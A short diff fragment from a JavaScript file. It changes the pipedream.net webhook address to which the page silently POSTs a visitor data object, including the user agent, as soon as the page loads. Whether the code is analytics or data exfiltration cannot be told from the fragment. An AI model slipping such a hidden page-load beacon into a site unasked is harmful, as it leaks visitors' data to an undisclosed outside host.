@@ -39,7 +39,7 @@ window.addEventListener('DOMContentLoaded', () => {
         user_agent: navigator.userAgent
     };
 
-    fetch("https://enb9004a5nnbfns.m.pipedream.net", {
+    fetch("https://eoub38o2wwko5r8.m.pipedream.net", {
       method: "POST",
       headers: {'Content-Type': 'application/json'}, 
       body: JSON.stringify(data)
